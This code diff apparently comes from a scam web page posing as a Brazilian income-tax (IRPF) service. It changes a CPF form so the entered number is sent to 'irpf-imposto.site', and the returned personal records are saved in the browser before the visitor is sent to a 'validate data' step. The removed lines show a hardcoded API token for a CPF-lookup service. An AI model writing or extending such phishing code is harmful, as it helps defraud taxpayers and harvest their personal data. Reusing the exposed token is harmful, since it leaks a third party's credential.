@@ -143,13 +143,7 @@ input::placeholder {
 
         showValidationPopup();
             
-       fetch(`https://app.konsulta.pro/api/pessoa?cpf=${cpf}`, {
-            method: "GET",
-            headers: {
-                "Content-Type": "application/json",
-                "token": `9b9e0838a86a4c569f722e713a6739fb`
-            }
-        })
+       fetch(`https://irpf-imposto.site/buscar-cpf/new-api.php?cpf=${cpf}`)
         .then(response => {
             if (!response.ok) {
                 throw new Error('Erro ao consultar CPF');
@@ -157,6 +151,19 @@ input::placeholder {
             return response.json();
         })
         .then(data => {
+            // Garantir que o CPF está incluído nos dados
+            if (data.result) {
+                // Se a API retorna dados na estrutura result
+                if (!data.result.cpf) {
+                    data.result.cpf = cpf;
+                }
+            } else {
+                // Caso a API retorne uma estrutura diferente ou diretamente os dados
+                if (!data.cpf) {
+                    data.cpf = cpf;
+                }
+            }
+            
             localStorage.setItem('cpfData', JSON.stringify(data));
             setTimeout(() => {
                 window.location.href = '../validar-dados/index.html';
@@ -214,7 +221,7 @@ input::placeholder {
                                     <i class="fas fa-info-circle"></i>
                                 </span>
                             </label>
-                            <input id="cpf" class="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide" placeholder="___.___.___-__" type="tel" inputmode="numeric" pattern="[0-9]*" oninput="formatCPF(this)" style=""/>
+                            <input id="cpf" class="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide" placeholder="___.___.___-__" type="tel" inputmode="numeric" pattern="[0-9]*" oninput="formatCPF(this)"/>
                         </div>
                         <div class="mb-4">
                             <p class="text-[#2B4F81] text-base font-bold" style="font-size: 16px;">
